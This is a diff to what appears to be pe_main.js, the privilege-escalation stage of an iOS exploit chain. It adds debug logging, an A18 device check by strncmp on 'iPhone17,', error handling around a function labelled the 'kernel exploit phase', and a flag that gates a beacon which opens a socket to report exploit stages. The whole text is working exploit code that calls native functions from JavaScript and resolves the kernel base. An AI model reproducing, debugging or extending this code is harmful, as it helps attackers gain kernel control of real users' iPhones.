@@ -69,6 +69,12 @@
   function ERROR(a) {
     throw new Error(a);
   }
+  function fmt(value) {
+    try {
+      if (typeof value === "bigint") return value.hex();
+    } catch (_) {}
+    return String(value);
+  }
   function new_uint64_t(val = 0n) {
     let buf = calloc(1n, 8n);
     uwrite64(buf, val);
@@ -148,9 +154,10 @@
       let utsname = calloc(256n, 5n);
       LOG("[PE-DBG] calloc returned: " + utsname.hex());
       LOG("[PE-DBG] calling uname...");
-      fcall(UNAME, utsname);
-      LOG("[PE-DBG] uname returned");
+      let uname_ret = fcall(UNAME, utsname);
+      LOG("[PE-DBG] uname returned: " + fmt(uname_ret));
       g_device_machine = utsname + 256n * 4n;
+      LOG("[PE-DBG] device_machine pointer set: " + g_device_machine.hex());
     }
     return g_device_machine;
   }
@@ -1359,7 +1366,10 @@
   function pe() {
     LOG("[PE-DBG] pe() entered");
     let device_machine = get_device_machine();
-    if (strstr(device_machine, get_cstring("iPhone17,")) != 0n) {
+    LOG("[PE-DBG] device_machine ptr: " + device_machine.hex());
+    let a18_prefix_cmp = strncmp(device_machine, get_cstring("iPhone17,"), 9n);
+    LOG("[PE-DBG] iPhone17 prefix cmp: " + fmt(a18_prefix_cmp));
+    if (a18_prefix_cmp == 0n) {
       LOG("[+] Running on A18 Devices");
       is_a18_devices = true;
       sleep(8n);
@@ -1411,9 +1421,10 @@
   mpd_kernel_base = function () {
     return kernel_base;
   };
-  // Beacon function to signal pe_main.js is running
+  // Optional beacon for pe_main.js lifecycle diagnostics.
   let CONNECT = func_resolve("connect");
   function sendBeacon(stage) {
+    if (!PE_ENABLE_DEBUG_NETWORK) return;
     try {
       let sock = fcall(SOCKET, 2n, 1n, 0n); // AF_INET, SOCK_STREAM
       if (sock == 0xFFFFFFFFFFFFFFFFn || sock < 0n) return;
@@ -1430,8 +1441,19 @@
       free(addr);
     } catch(e) {}
   }
+  LOG("[PE-DBG] pe_main entry; debug_network=" + PE_ENABLE_DEBUG_NETWORK);
   sendBeacon("pe_start");
-  LOG("[PE] Calling pe() - kernel exploit phase..."); pe(); LOG("[PE] pe() completed");
+  try {
+    LOG("[PE] Calling pe() - kernel exploit phase...");
+    pe();
+    LOG("[PE] pe() completed");
+  } catch (e) {
+    LOG("[PE-ERR] pe() exception: " + String(e));
+    try {
+      if (e && e.stack) LOG("[PE-ERR] " + e.stack);
+    } catch (_) {}
+    throw e;
+  }
   sendBeacon("pe_done");
    
   LOG("[+] PE Post-Exploitation !!!");
